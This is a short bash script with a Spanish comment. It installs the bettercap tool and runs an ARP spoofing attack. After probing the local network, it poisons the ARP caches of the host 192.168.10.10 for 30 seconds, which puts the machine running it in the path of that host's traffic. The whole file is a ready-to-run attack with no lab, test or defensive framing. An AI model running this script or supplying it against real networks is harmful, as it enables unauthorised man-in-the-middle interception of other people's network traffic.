#!/bin/bash
# Instalar mejorcap y lanzar ataque ARP Spoofing

apt update && apt install -y bettercap

bettercap -eval "
net.probe on;
net.recon on;
sleep 5;
set arp.spoof.targets 192.168.10.10;
arp.spoof on;
sleep 30;
arp.spoof off;
exit"
